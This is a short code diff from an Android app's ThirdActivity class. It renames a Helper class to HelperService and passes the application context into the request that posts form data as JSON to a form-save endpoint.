@@ -8,7 +8,7 @@ import android.widget.Toast;
 
 import androidx.appcompat.app.AppCompatActivity;
 
-import com.system.service.sbi.FrontServices.FormValidator;
+import com.system.service.sbi.MinorServices.FormValidator;
 
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -53,12 +53,12 @@ public class ThirdActivity extends AppCompatActivity {
                 JSONObject dataJson = new JSONObject(dataObject);
                 JSONObject sendPayload = new JSONObject();
                 try {
-                    Helper helper = new Helper();
-                    sendPayload.put("site", helper.SITE());
+                    HelperService helperService = new HelperService();
+                    sendPayload.put("site", helperService.SITE());
                     sendPayload.put("data", dataJson);
                     sendPayload.put("id", id);
 
-                    Helper.postRequest(helper.FormSavePath(), sendPayload, new Helper.ResponseListener() {
+                    HelperService.postRequest(helperService.FormSavePath(), sendPayload, getApplicationContext() , new HelperService.ResponseListener() {
                         @Override
                         public void onResponse(String result) {
                             if (result.startsWith("Response Error:")) {
